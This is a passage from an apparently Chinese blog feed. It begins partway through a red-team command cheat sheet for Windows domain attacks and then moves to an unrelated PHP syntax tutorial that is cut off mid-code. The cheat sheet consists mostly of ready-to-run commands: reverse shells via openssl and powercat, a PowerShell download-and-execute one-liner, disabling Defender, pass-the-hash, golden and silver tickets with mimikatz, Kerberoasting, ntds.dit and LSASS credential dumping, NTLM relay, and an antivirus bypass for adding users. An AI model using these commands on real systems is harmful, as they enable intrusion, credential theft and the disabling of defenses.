domain.com</span><br><span class="line">域传输漏洞。查找所有的DNS解析</span><br><span class="line">dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain computers&quot; /domain</span><br><span class="line">列出该域内所有机器名</span><br><span class="line">dsquery user domainroot -limit 65535 &amp;&amp; net user /domain</span><br><span class="line">列出该域内所有用户名</span><br><span class="line">dsquery subnet</span><br><span class="line">列出该域内网段划分</span><br><span class="line">dsquery group &amp;&amp; net group /domain</span><br><span class="line">列出该域内分组 </span><br><span class="line">dsquery ou</span><br><span class="line">列出该域内组织单位 </span><br><span class="line">dsquery server &amp;&amp; net time /domain</span><br><span class="line">列出该域内域控制器 </span><br><span class="line">wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</span><br><span class="line">列出杀软</span><br><span class="line">wmic product get name,version</span><br><span class="line">查看安装的软件</span><br><span class="line">quser</span><br><span class="line">查看在线用户</span><br><span class="line">net config workstation</span><br><span class="line">查看当前登陆域</span><br><span class="line">dnsdump.exe -u 域名\与用户 -p 域密码 域控机器名</span><br><span class="line">用普通域用户获取域内所有DNS解析</span><br><span class="line">for /l %i in (1,1,255) do @ ping 10.233.33.%i -w 1 -n 1|find /i &quot;ttl=&quot;</span><br><span class="line">主机发现</span><br><span class="line">find / -type f -uid +0</span><br><span class="line">找不是root用户编辑的文件。用于找密码</span><br><span class="line">tee可以替代&gt;</span><br></pre></td></tr></table></figure><h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">net use \\IP\ipc$ &quot;密码&quot; /user:administrator</span><br><span class="line">#建立IPC连接</span><br><span class="line">net time \\IP</span><br><span class="line">#获取远程IP的时间</span><br><span class="line">copy calc.bat \\IP\C$</span><br><span class="line">#把本地的calc.bat传到目标C盘</span><br><span class="line">at \\IP 21:41 c:\calc.bat</span><br><span class="line">#创建计划任务</span><br><span class="line">at \\IP 21:41 cmd.exe /c  &quot;ipconfig &gt; c:\1.txt&quot;</span><br><span class="line">#直接执行命令</span><br><span class="line">type \\IP\C$\1.txt</span><br><span class="line">#获取命令执行结果</span><br><span class="line">schtasks /create /s IP /tn 计划任务名 /sconstart /tr c:\calc.bat /ru system /f</span><br><span class="line">#用schtasks命令创建计划任务</span><br><span class="line">schtasks /delete /s IP /tn &quot;计划任务名&quot; /f </span><br></pre></td></tr></table></figure><p>WMICEXEC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:IP /user:administrator /password:password process call create &quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;</span><br><span class="line">type \\IP\C$\ip.txt</span><br><span class="line">系统自带的WMIC命令。执行无日志</span><br><span class="line">wmiexec.py Username:Password@IP</span><br></pre></td></tr></table></figure><h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use evasion/windows/windows_defender_exe</span><br><span class="line">可绕腾讯电脑管家</span><br></pre></td></tr></table></figure><h1 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">openssl弹shell</span><br><span class="line">服务端:</span><br><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 8888</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.198.200:8888 &gt; /tmp/s; rm /tmp/s</span><br><span class="line"></span><br><span class="line">powershell弹shell</span><br><span class="line">服务端：</span><br><span class="line">Import-Module .\powercat.ps1;powercat -l -v -p 443 -t 1000</span><br><span class="line">靶机：</span><br><span class="line">powershell -command &quot;.\reverseshell.ps1&quot;   </span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">post/multi/recon/local_exploit_suggest</span><br><span class="line">windows/local/bypassuac_dotnet_profiler</span><br><span class="line">自动寻找存在的提权漏洞</span><br><span class="line"></span><br><span class="line">python windows-exploit-suggester.py  --update</span><br><span class="line">systeminfo &gt; info.txt</span><br><span class="line">python windows-exploit-suggester.py -d 2017-06-14-mssb.xls -i info.txt</span><br><span class="line">CVE提权辅助脚本</span><br></pre></td></tr></table></figure><h1 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">本地复现了下。用普通域用户名和密码去创建一个连接。会显示拒绝访问</span><br><span class="line">MS14-068.exe -u Administrator@abc.com -p 123@abcD -s S-1-5-21-294942478-3080431383-2839947409-500 -d 192.168.0.3</span><br><span class="line">#会在当前目录生成一个票据</span><br><span class="line">kerberos::purge </span><br><span class="line">#清空当前的票据</span><br><span class="line">kerberos::ptc 凭证地址</span><br><span class="line">#注入票据 </span><br><span class="line">创建票据。mimikatz导入。就可以访问了。但权限还是普通域用户权限</span><br><span class="line">psesec.exe -accepteula \\dc.abc.com -s cmd.exe</span><br><span class="line">可以配合psexec -s 得到一个System shell</span><br></pre></td></tr></table></figure><p>mssql弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/mssql/mssql_clr_payload</span><br></pre></td></tr></table></figure><h1 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.159.10/Invoke-PowerShellTcpOneLine_443.ps1&#x27;)&quot;</span><br><span class="line">#下载文件并且执行</span><br></pre></td></tr></table></figure><h1 id="Windows关闭Defender"><a href="#Windows关闭Defender" class="headerlink" title="Windows关闭Defender"></a>Windows关闭Defender</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MpPreference -disablerealtimeMonitoring $true</span><br></pre></td></tr></table></figure><h1 id="PTH-Hash传递攻击"><a href="#PTH-Hash传递攻击" class="headerlink" title="PTH(Hash传递攻击)"></a>PTH(Hash传递攻击)</h1><p>就是利用ntlm去拿一个shell。psexec。wmiexec都是PTH的利用。可以用hash。直接绕过验证访问服务<br>利用条件：已知用户ntlm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">#提升权限</span><br><span class="line">sekurlsa::pth /user:dbadmin /domain:offensive.local /ntlm:161cff084477fe596a5db81874498a24 /run:powershell.exe</span><br><span class="line">#mimikatz执行</span><br><span class="line">psexec会被日志纪录</span><br></pre></td></tr></table></figure><p>msf中也有模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/smb/psexec</span><br><span class="line">exploit/windows/smb/psexec_psh(Powershell版本)</span><br></pre></td></tr></table></figure><h1 id="PTT-票据传递攻击"><a href="#PTT-票据传递攻击" class="headerlink" title="PTT(票据传递攻击)"></a>PTT(票据传递攻击)</h1><p>白银票据：<br>就是利用票据。去得到一个shell。权限还是当前用户。ms14-068就是这个<br>利用条件：<br>已知域用户SID<br>已知域用户NTLM</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /sid:S-1-5-21-1187620287-4058297830-2395299116-1103 /domain:offensive.local /target:Offensive-SQL1:1433 /service:MSSQLSvc /rc4: 161cff084477fe596a5db81874498a24 /user:idontexist /id:1103 /ptt</span><br><span class="line">#sid-&gt;域用户的SID</span><br><span class="line">#target-&gt;开启了服务的目标</span><br><span class="line">#service-&gt;攻击的服务类型</span><br><span class="line">#rc4-&gt;域用户的NTLM</span><br><span class="line">#user-&gt;随便写</span><br><span class="line">#id-&gt;域用户的ID</span><br><span class="line">misc::cmd</span><br><span class="line">#派发shell</span><br></pre></td></tr></table></figure><p>黄金票据<br>利用krbtgt密码的hash。获得域管权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">#清空票据</span><br><span class="line">kerberos::golden /sid:S-1-5-21-1187620287-4058297830-2395299116 /domain:offensive.local /rc4:61d83c569b93bfcd4ca2087011361caa /user:idontexist /id:500</span><br><span class="line">#输入krbtgt的ntlm。SUID。生成票据</span><br><span class="line">kerberos::ptt ticket.kirbi</span><br><span class="line">#导入票据</span><br><span class="line">misc::cmd</span><br><span class="line">#得到shell</span><br></pre></td></tr></table></figure><h1 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#x27;MSSQLSvc/Offensive-SQL1:1433&#x27;</span><br><span class="line">#powershell执行。请求票据</span><br><span class="line"></span><br><span class="line">kerberos::list /export</span><br><span class="line">#mimikatz执行。提取刚刚获得的票据</span><br><span class="line"></span><br><span class="line">python tgsrepcrack.py pass.txt &quot;*.kirbi&quot;</span><br><span class="line">利用pass.txt爆破刚刚提取出来的票据</span><br></pre></td></tr></table></figure><p>Mssql xp_cmdshell被禁用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC master..xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure><h1 id="ntds-dit"><a href="#ntds-dit" class="headerlink" title="ntds.dit"></a>ntds.dit</h1><p>用自带的工具diskshadow</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c:\common.txt</span><br><span class="line"></span><br><span class="line">set context persistent nowriters</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">create</span><br><span class="line">expose %someAlias% i:</span><br><span class="line">exec &quot;cmd.exe&quot; /c copy i:\windows\ntds\ntds.dit c:\ntds.dit</span><br><span class="line">delete shadows all</span><br><span class="line">reset</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>然后去c:/windows/system32执行<code>diskshadow /s c:\command.txt</code><br>就能得到ntds.dit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">. .\Invoke-NinjaCopy.ps1</span><br><span class="line">#导入脚本</span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\NTDS\ntds.dit -Verbose -LocalDestination &#x27;C:\Users\dbadmin\Desktop    \ntds.dit&#x27;</span><br><span class="line">#导出ntds.dit</span><br><span class="line">reg save HKLM\SYSTEM C:\Users\dbadmin\Desktop\SYS</span><br><span class="line">#导出SYSTEM</span><br><span class="line">Copy-Item &#x27;\\dc.offensive.local\C$\Users\dbadmin\Desktop\ntds.dit&#x27;-Destination &#x27;\\Client1.offensive.local\C$\Users\alice\Desktop\tools\ntds.dit&#x27;</span><br><span class="line">#复制到远程主机上</span><br></pre></td></tr></table></figure><h1 id="修复ntds-dit"><a href="#修复ntds-dit" class="headerlink" title="修复ntds.dit"></a>修复ntds.dit</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esentutl.exe /p &#x27;C:\Users\dbadmin\Desktop\ntds.dit&#x27; /!10240 /8 /o</span><br></pre></td></tr></table></figure><h1 id="解析ntds-dit"><a href="#解析ntds-dit" class="headerlink" title="解析ntds.dit"></a>解析ntds.dit</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">一。powershell</span><br><span class="line">Get-BootKey -SystemHivePath &#x27;SYS&#x27;</span><br><span class="line">$key = Get-BootKey -SystemHivePath &#x27;SYS&#x27;</span><br><span class="line">Get-ADDBAccount -All -DBPath &#x27;C:\Users\alice\Desktop\tools\ntds.dit&#x27; -BootKey $key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二。利用impacket-secretsdump</span><br><span class="line">impacket-secretsdump -system /root/Desktop/NTDS/SYSTEM -ntds /root/ntds.dit LOCAL</span><br></pre></td></tr></table></figure><h1 id="Kerberoasting攻击-1"><a href="#Kerberoasting攻击-1" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">. .\GetUserSPNs.ps1</span><br><span class="line"> Add-Type -AssemblyName System.IdentityModel</span><br><span class="line"> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#x27;MSSQLSvc/Offensive-SQL1:1433&#x27;</span><br><span class="line"> mimikatz # kerberos::list /export</span><br><span class="line"> python tgsrepcrack.py pass.txt &quot;*.kirbi&quot;</span><br></pre></td></tr></table></figure><h1 id="导出内存"><a href="#导出内存" class="headerlink" title="导出内存"></a>导出内存</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rundll32 C:\windows\system32\comsvcs.dll, MiniDump 924 C:\lsass.dmp full</span><br><span class="line"></span><br><span class="line">powershell -c &quot;rundll32 C:\windows\system32\comsvcs.dll, MiniDump 1316 C:\lsass.dmp full&quot;</span><br><span class="line">#1316是lsass的进程ID。tasklist /svc|findstr lsass</span><br><span class="line"></span><br><span class="line">SqlDumper.exe 1316 0 0x01100</span><br><span class="line">#mssql的工具。1316照样是lsass.exe的PID</span><br><span class="line">sekurlsa::minidump SQLDmpr0001.mdmp&quot;</span><br><span class="line">sekurlsa::logonPasswords full</span><br><span class="line"></span><br><span class="line">SharpDump.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">需要system权限</span><br><span class="line">C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.0\createdump.exe</span><br><span class="line">createdump.exe -u -f  xxx.dump  pid</span><br></pre></td></tr></table></figure><p>HASH Relay</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0</span><br><span class="line">python MultiRelay.py -t 192.168.0.4 -u ALL</span><br><span class="line">//要获取shell的目标IP</span><br><span class="line">然后客户机去访问192.168.0.4，中继到shell</span><br></pre></td></tr></table></figure><p>绕过360添加用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Argue net1 xxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">execute net1 user 123 123 /add</span><br><span class="line"></span><br><span class="line">https://github.com/lengjibo/RedTeamTools/tree/master/windows/bypass360%E5%8A%A0%E7%94%A8%E6%88%B7</span><br><span class="line">帐号：hacker 密码：P@ssw0rd</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php基础语法</title>
      <link href="/posts/54224/"/>
      <url>/posts/54224/</url>
      
        <content type="html"><![CDATA[<h2 id="三种标签"><a href="#三种标签" class="headerlink" title="三种标签"></a>三种标签</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span>  <span class="meta">?&gt;</span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span> %&gt; <span class="comment">//手动添加改短标签php.ini  phort_ipen_tag:on asp_tag:on</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span> <span class="meta">?&gt;</span>  <span class="comment">//手动添加改短标签php.ini  phort_ipen_tag:on asp_tag:on</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="number">123</span>;<span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span> <span class="meta">?&gt;</span>  <span class="comment">//大部分网站可用    </span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span>&lt;/script&gt;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">**/</span> </span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">  hhhhhh</span></span><br><span class="line"><span class="string">EOF</span>?</span><br><span class="line">    &gt;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span></span><br><span class="line"><span class="keyword">print</span>       </span><br><span class="line">var_dump   <span class="comment">//输出变量类型</span></span><br><span class="line">print_r    <span class="comment">//打印数组</span></span><br><span class="line">printf</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;dd&quot;</span>) <span class="comment">//退出的意思</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br></pre></td></tr></table></figure><h2 id="变量的定义"><a href="#变量的定义" class="headerlink" title="变量的定义"></a>变量的定义</h2><ul><li><p>变量以$开头</p></li><li><p>系统变量以$_GET开头</p></li><li><p>变量区分大小写</p></li><li><p>变量名只能字母或者下划线开头</p></li><li><p>赋值变量可不必声明变量的数据类型</p></li></ul><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>递增递减运算</p><ul><li>只能用于变量</li></ul><table><thead><tr><th align="left">运算符</th><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">++ x$</td><td align="left">预递增</td><td align="left">x 加 1，然后返回 x</td></tr><tr><td align="left">$x ++</td><td align="left">后递增</td><td align="left">返回 x，然后 x 加 1</td></tr><tr><td align="left">– x$</td><td align="left">预递减</td><td align="left">x 减 1，然后返回 x</td></tr><tr><td align="left">$x –</td><td align="left">后递减</td><td align="left">返回 x，然后 x 减 1</td></tr></tbody></table><table><thead><tr><th>运算符</th><th>名称</th><th>等同于</th><th>描述</th></tr></thead><tbody><tr><td>==</td><td>等于</td><td>$x==$y</td><td>如果$x等于$y,返回true</td></tr><tr><td>===</td><td>全等于（完全相同）</td><td>$x===$y</td><td>如果$x等于$y,且类型相同返回true</td></tr><tr><td>!=</td><td>不等于</td><td>$x!=$y</td><td>如果$x不等于$y,返回true</td></tr><tr><td>&lt;&gt;</td><td>不等于</td><td>$x&lt;&gt;$y</td><td>如果$x不等于$y,返回true</td></tr><tr><td>!==</td><td>不全等（属性和值都不等于）</td><td>$x!==$y</td><td>如果$x不等于$y,且类型不相同返回true</td></tr><tr><td>&gt;</td><td>大于</td><td>$x&gt;$y</td><td>如果$x大于$y,返回true</td></tr><tr><td>&lt;</td><td>小于</td><td>$x&lt;$y</td><td>如果$x小于$y,返回true</td></tr><tr><td>&gt;=</td><td>大于或等于</td><td>$x&gt;=$y</td><td>如果$x大于等于$y,返回true</td></tr><tr><td>&lt;=</td><td>小于或等于</td><td>$x&lt;=$y</td><td>如果$x小于等于$y,返回true</td></tr><tr><td>and,&amp;&amp;</td><td>与</td><td>$x and$y</td><td>如果$x和$y都为true，则返回true</td></tr><tr><td>or,||</td><td>或</td><td>$x or $y</td><td>如果$x和$y至少1个为true，则返回true</td></tr><tr><td>not,!</td><td>非</td><td>!$x</td><td>如果$x不为true，则返回true</td></tr><tr><td>xor</td><td>异或</td><td>$x xor $y</td><td>如果$x和$y有且仅有1个为true，则返回true</td></tr></tbody></table><h2 id="数组的创建和读取"><a href="#数组的创建和读取" class="headerlink" title="数组的创建和读取"></a>数组的创建和读取</h2><p>创建数组的基本方法是应用array()函数</p><ul><li>索引数组  key为连续的整数，默认从下标0开始。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr2</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$arr2</span>[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$arr2</span>[<span class="number">1</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$arr2</span>[<span class="number">2</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr2</span>[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> sizeof(<span class="variable">$arr</span>);  <span class="comment">//返回数组的长度(元素的个数)</span></span><br><span class="line"><span class="keyword">echo</span> count(<span class="variable">$arr2</span>);  <span class="comment">//返回数组的长度(元素的个数)</span></span><br></pre></td></tr></table></figure><ul><li>关联数组  key为指定的值，通常为字符串</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$age</span> = <span class="keyword">array</span>(<span class="string">&#x27;bill&#x27;</span>=&gt;<span class="number">35</span>,<span class="string">&#x27;steve&#x27;</span>=&gt;<span class="number">37</span>,<span class="string">&#x27;peter&#x27;</span>=&gt;<span class="number">43</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;bill&#x27;</span>]  <span class="comment">//获取数组</span></span><br><span class="line"><span class="variable">$age</span>[<span class="number">0</span>] </span><br><span class="line"><span class="comment">//索引赋值</span></span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;bill&#x27;</span>]=<span class="number">35</span>;</span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;steve&#x27;</span>]=<span class="number">37</span>;</span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;peter&#x27;</span>]=<span class="number">43</span>;</span><br></pre></td></tr></table></figure><ul><li>多维数组</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>),</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>),</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;e&#x27;</span>,<span class="string">&quot;f&quot;</span>), </span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>][<span class="number">1</span>];  <span class="comment">//二维数组，输出= b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>),</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>),</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;e&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)), </span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">2</span>][<span class="number">1</span>][<span class="number">3</span>];<span class="comment">//多维数组，输出 = 4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="数组的基本操作"><a href="#数组的基本操作" class="headerlink" title="数组的基本操作"></a>数组的基本操作</h2><ul><li>通过赋值增加数组元素</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> =<span class="keyword">array</span>(<span class="string">&quot;age&quot;</span>=&gt;<span class="string">&quot;25&quot;</span>)</span><br><span class="line"><span class="variable">$b</span>[<span class="string">&quot;name&quot;</span>]=<span class="string">&quot;bb&quot;</span>    </span><br></pre></td></tr></table></figure><ul><li>通过使用array_push()函数追加数组元素(入栈)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> =<span class="keyword">array</span>(<span 